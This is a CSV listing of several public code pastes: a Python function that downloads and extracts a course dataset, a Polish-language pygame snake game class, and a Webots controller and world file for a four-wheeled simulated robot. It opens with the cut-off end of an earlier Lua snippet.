id,title,username,language,date,content
      backpack.pushItem(""UP"",1)
    end
  end
"
xca9emyp,Dataset Download,Infinity99HD,Python,Wednesday 28th of May 2025 10:46:32 AM CDT,"# Dataset download

def download_dataset(
        url=""https://proai-datasets.s3.eu-west-3.amazonaws.com/progetto-finale-flowes.tar.gz"", 
        tar_name=""progetto-finale-flowes.tar.gz"", 
        extracted_file_name=""progetto-finale-flowes""
                     ):
    """"""
    Downloads and extracts the dataset if it does not already exist.
    """"""

    if not os.path.exists(""progetto-finale-flowes.tar.gz""):
        print(""Downloading dataset..."")
        file = requests.get(url)

        if file.status_code == 200:
            with open(tar_name, ""wb"") as f:
                f.write(file.content)
                print(""Download complete!"")

            if not os.path.exists(extracted_file_name):
                print(""Extracting dataset..."")
                with tarfile.open(tar_name, ""r:gz"") as f:
                    f.extractall(path=extracted_file_name)
                    print(""Extraction complete!"")

                    # Change directory to the extracted folder
                    os.rename(""progetto-finale-flowes/progetto-finale-flowes"", ""dataset"")
        else:
            print(""Failed to download dataset. Status code:"", file.status_code)"
RAnyV25g,Kierunek.py,black_duck11,Python,Wednesday 28th of May 2025 10:10:33 AM CDT,"from enum import Enum
class Kierunek(Enum):
    GORA = 0
    PRAWO = 1
    DOL = 2
    LEWO = 3"
aa7k6rW5,Waz.py,black_duck11,Python,Wednesday 28th of May 2025 10:09:12 AM CDT,"import pygame
import copy
from Kierunek import Kierunek
from Segment import Segment
class Waz(pygame.sprite.Sprite):
    def __init__(self):
    #oryginalny obraz głowy
        
        self.oryginalny_obraz = pygame.image.load(""images/head.png"")
    
        self.obraz = pygame.transform.rotate(self.oryginalny_obraz, 0)
    #współrzędne głowy
        self.rect = self.obraz.get_rect(center=(12*32+16, 9*32+16))#aktualna pozycja
        self.kierunek = Kierunek.GORA
        self.nowy_kierunek = Kierunek.GORA
        self.ostatnia_pozycja=self.rect
        self.dodaj_segment=False
        self.segmenty=[]#lista ze wszystkimi segmentami


        
    def zmien_kierunek(self, kierunek):
        zmiana_mozliwa = True
        if kierunek == Kierunek.GORA and self.kierunek == Kierunek.DOL:
            zmiana_mozliwa = False
        if kierunek == Kierunek.DOL and self.kierunek == Kierunek.GORA:
            zmiana_mozliwa=False
        if kierunek == Kierunek.LEWO and self.kierunek == Kierunek.PRAWO:
            zmiana_mozliwa = False
        if kierunek == Kierunek.PRAWO and self.kierunek == Kierunek.LEWO:
            zmiana_mozliwa = False
        if zmiana_mozliwa:
            self.nowy_kierunek = kierunek
            
    def aktualizuj(self):
        self.kierunek = self.nowy_kierunek
        self.obraz = pygame.transform.rotate(self.oryginalny_obraz,(self.kierunek.value*-90))
        self.ostatnia_pozycja=copy.deepcopy(self.rect)
        if self.kierunek == Kierunek.GORA:
            self.rect.move_ip(0, -32)
        if self.kierunek == Kierunek.PRAWO:
            self.rect.move_ip(32, 0)
        if self.kierunek == Kierunek.LEWO:
            self.rect.move_ip(-32, 0)
        if self.kierunek == Kierunek.DOL:
            self.rect.move_ip(0, 32)
        for segment in range(len(self.segmenty)):
            #dla pierwszego segmenty
            if segment==0:
                #przesunięcie pierwszego segmentu do ostatniej pozycji głowy
                self.segmenty[segment].przesun(self.ostatnia_pozycja)
            else:
                self.segmenty[segment].przesun(self.segmenty[segment-1].ostatnia_pozycja)
        if self.dodaj_segment:
            nowy_segment=Segment()
            nowa_pozycja=None
            if len(self.segmenty)>0:
                nowa_pozycja =copy.deepcopy(self.segmenty[-1].pozycja)
            else:
                nowa_pozycja=copy.deepcopy(self.ostatnia_pozycja)
            nowy_segment.pozycja=nowa_pozycja
            self.segmenty.append(nowy_segment)
            self.dodaj_segment=False
            
    def rysuj_segment(self,ekran):
        for segment in self.segmenty:
            ekran.blit(segment.obraz,segment.pozycja)
    def jedz_jablko(self):
        self.dodaj_segment=True
    





        



        "
piq3dpgy,4wheelscontroller.py,DrAungWinHtut,Python,Wednesday 28th of May 2025 10:00:56 AM CDT,"from controller import Robot

if __name__=='__main__':
    robot = Robot()
    
    timestep = 64
    max_speed = 6.28
    
    left_front_motor = robot.getDevice('motor_left_front')
    right_front_motor = robot.getDevice('motor_right_front')
    left_back_motor = robot.getDevice('motor_left_back')
    right_back_motor = robot.getDevice('motor_right_back')
    #left_motor.setPosition(float('inf'))
    left_front_motor.setPosition(float('inf'))
    right_front_motor.setPosition(float('inf'))
    left_back_motor.setPosition(float('inf'))
    right_back_motor.setPosition(float('inf'))
    left_front_motor.setVelocity(10);
    right_front_motor.setVelocity(10);
    left_back_motor.setVelocity(10);
    right_back_motor.setVelocity(10);
    "
VNe1xMh0,4wheels1.wbt,DrAungWinHtut,JSON,Wednesday 28th of May 2025 09:59:53 AM CDT,"#VRML_SIM R2025a utf8

EXTERNPROTO ""https://raw.githubusercontent.com/cyberbotics/webots/R2025a/projects/objects/backgrounds/protos/TexturedBackground.proto""
EXTERNPROTO ""https://raw.githubusercontent.com/cyberbotics/webots/R2025a/projects/objects/backgrounds/protos/TexturedBackgroundLight.proto""
EXTERNPROTO ""https://raw.githubusercontent.com/cyberbotics/webots/R2025a/projects/objects/floors/protos/RectangleArena.proto""

WorldInfo {
}
Viewpoint {
  orientation 0.07987357375373524 -0.10424624051044758 -0.9913389599704254 4.967162579952054
  position -0.1355848939873358 -0.7054274144021473 0.2015211425405409
}
TexturedBackground {
}
TexturedBackgroundLight {
}
RectangleArena {
  floorSize 2 2
}
Solid {
  translation 0.21 0 0
  children [
    Shape {
      appearance PBRAppearance {
        baseColor 0 0 0
        roughness 1
        metalness 0
      }
      geometry Box {
        size 0.05 0.05 0.05
      }
    }
  ]
}
DEF Robot Robot {
  translation -6.009278448241306e-05 0.02005605151113183 0.020634987421419324
  rotation 0.13121761188466757 -0.0005927504440141294 -0.9913534117448712 3.873043426496412e-05
  children [
    DEF SolidBody Solid {
      translation -2.855527945213741e-14 6.938893903907228e-18 -0.0007249040012106758
      rotation 0 0 -1 6.408428074369474e-07
      children [
        DEF Left_Back_Joint HingeJoint {
          jointParameters DEF Left_Back_Joint HingeJointParameters {
            position -2.3871655094803524e-08
            axis 0 1 0
            anchor -0.05 0.05 0
          }
          device [
            RotationalMotor {
              name ""motor_left_back""
            }
          ]
          endPoint Solid {
            translation -0.05000000000000002 0.05 6.063894724883258e-10
            rotation 0.9999999999999196 -3.3863989185341237e-07 2.1511559365139866e-07 1.570000003442234
            children [
              DEF wheel Shape {
                appearance PBRAppearance {
                  baseColor 1 0 0
                  roughness 1
                  metalness 0
                }
                geometry Cylinder {
                  height 0.01
                  radius 0.02
                }
              }
            ]
            name ""solid2(3)""
            boundingObject DEF wheel Shape {
              appearance PBRAppearance {
                baseColor 1 0 0
                roughness 1
                metalness 0
              }
              geometry Cylinder {
                height 0.01
                radius 0.02
              }
            }
            physics Physics {
            }
          }
        }
        DEF Right_Back_Joint HingeJoint {
          jointParameters DEF Right_Back_Joint HingeJointParameters {
            position -1.3708306093926636e-08
            axis 0 1 0
            anchor -0.05 -0.05 0
          }
          device [
            RotationalMotor {
              name ""motor_right_back""
            }
          ]
          endPoint Solid {
            translation -0.05 -0.05 -1.0989830969372583e-10
            rotation 0.9999999999999224 -3.3355418454286464e-07 2.1003393776393883e-07 1.5699999964904536
            children [
              DEF wheel Shape {
                appearance PBRAppearance {
                  baseColor 1 0 0
                  roughness 1
                  metalness 0
                }
                geometry Cylinder {
                  height 0.01
                  radius 0.02
                }
              }
            ]
            name ""solid2(2)""
            boundingObject DEF wheel Shape {
              appearance PBRAppearance {
                baseColor 1 0 0
                roughness 1
                metalness 0
              }
              geometry Cylinder {
                height 0.01
                radius 0.02
              }
            }
            physics Physics {
            }
          }
        }
        DEF Right_Front_Joint HingeJoint {
          jointParameters DEF Right_Front_Joint HingeJointParameters {
            position -2.4635991639223045e-08
            axis 0 1 0
            anchor 0.05 0.05 0
          }
          device [
            RotationalMotor {
              name ""motor_right_front""
            }
          ]
          endPoint Solid {
            translation 0.04999999999999999 0.05 6.16379873032281e-10
            rotation 0.9999999999999527 1.46934204554187e-07 -2.700719703756882e-07 1.5699999991142959
            children [
              DEF wheel Shape {
                appearance PBRAppearance {
                  baseColor 1 0 0
                  roughness 1
                  metalness 0
                }
                geometry Cylinder {
                  height 0.01
                  radius 0.02
                }
              }
            ]
            name ""solid2(1)""
            boundingObject DEF wheel Shape {
              appearance PBRAppearance {
                baseColor 1 0 0
                roughness 1
                metalness 0
              }
              geometry Cylinder {
                height 0.01
                radius 0.02
              }
            }
            physics Physics {
            }
          }
        }
        DEF Left_Front_Joint HingeJoint {
          jointParameters DEF Left_Front_Joint HingeJointParameters {
            axis 0 1 0
            anchor 0.05 -0.05 0
          }
          device [
            RotationalMotor {
              name ""motor_left_front""
            }
          ]
          endPoint Solid {
            translation 0.05 -0.05 6.163806434157709e-10
            rotation 0.9999999999999473 1.5926197332664142e-07 -2.823899364351547e-07 1.5700000008854709
            children [
              DEF wheel Shape {
                appearance PBRAppearance {
                  baseColor 1 0 0
                  roughness 1
                  metalness 0
                }
                geometry Cylinder {
                  height 0.01
                  radius 0.02
                }
              }
            ]
            name ""solid2""
            boundingObject DEF wheel Shape {
              appearance PBRAppearance {
                baseColor 1 0 0
                roughness 1
                metalness 0
              }
              geometry Cylinder {
                height 0.01
                radius 0.02
              }
            }
            physics Physics {
            }
          }
        }
        DEF Body Shape {
          appearance PBRAppearance {
            baseColor 0.145098 0.145098 0.145098
            roughness 1
            metalness 0
          }
          geometry Box {
            size 0.2 0.1 0.01
          }
        }
      ]
      name ""Body""
      boundingObject USE Body
      physics Physics {
      }
    }
  ]
  boundingObject USE Body
  physics Physics {
  }
  controller ""4wheel1controller""
}
"
